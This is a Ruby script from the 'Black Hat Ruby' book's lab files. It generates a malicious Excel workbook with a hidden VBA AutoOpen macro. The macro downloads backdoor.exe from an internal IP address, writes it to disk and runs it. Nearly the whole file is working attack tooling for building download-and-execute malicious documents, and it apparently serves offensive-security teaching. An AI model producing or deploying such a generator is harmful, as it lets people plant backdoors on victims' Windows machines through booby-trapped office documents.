#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Creating an evil excel file with macro to download and execute backdoor on Windows
# Requirements:
#   Windows OS
#
unless Gem.win_platform?
  puts "[!] This script runs only on Windows OS!"
  exit!
end

require 'win32ole'

def evil_excel(vbs_file, excel_file)
  excel          = WIN32OLE.new('Excel.Application')
  excel.visible  = false
  workbook       = excel.workbooks.add
  worksheet      = workbook.Worksheets(1)
  worksheet.name = "Black Hat Ruby Sheet"
  code_mod       = workbook.VBProject.VBComponents.Item('ThisWorkbook')
  fileformat     = 52
  vbs_file.each_line(chomp: true)
          .with_index { |loc, ln| code_mod.CodeModule.InsertLines(ln + 1, loc) }
  workbook.SaveAs(excel_file, fileformat)
  excel.ActiveWorkbook.Close(0)
  excel.Quit()
end

vbs = <<~VBSCode
Sub AutoOpen()

Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://192.168.100.10/backdoor.exe", False
xHttp.Send

With bStrm
 .Type = 1 '//binary
 .Open
 .write xHttp.responseBody
 .savetofile "file.exe", 2 '//overwrite
End With

Shell ("file.exe")

End Sub 
VBSCode
evil_excel(vbs, 'badexcel')